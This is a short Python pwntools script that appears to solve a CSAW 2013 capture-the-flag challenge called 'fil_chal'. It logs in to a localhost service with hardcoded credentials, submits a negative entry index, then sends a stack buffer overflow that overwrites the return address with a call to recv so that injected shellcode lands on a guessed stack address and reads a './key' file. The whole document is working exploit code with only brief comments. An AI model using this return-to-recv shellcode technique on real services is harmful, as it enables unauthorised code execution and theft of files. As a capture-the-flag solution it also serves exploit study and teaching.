from pwn import *

# Need to run multiple times

bin = ELF("fil_chal")
p = process("./fil_chal")

shellcode = asm(pwnlib.shellcraft.i386.linux.readfile("./key", 4))
random_stack_addr = 0xff88a534

conn = remote("localhost", 34266)

conn.sendline("csaw2013")
conn.sendline("S1mplePWD")

conn.recvuntil("Entry")
conn.sendline("-1")

payload = "a"*0x41c
payload += "a"*4
log.info(hex(bin.symbols['recv']))
# Overwriting return address
payload += p32(bin.symbols['recv'])
payload += p32(random_stack_addr)
payload += p32(4)
payload += p32(random_stack_addr)
payload += p32(100)
payload += p32(0)

conn.sendline(payload)

conn.sendline(shellcode)

conn.interactive()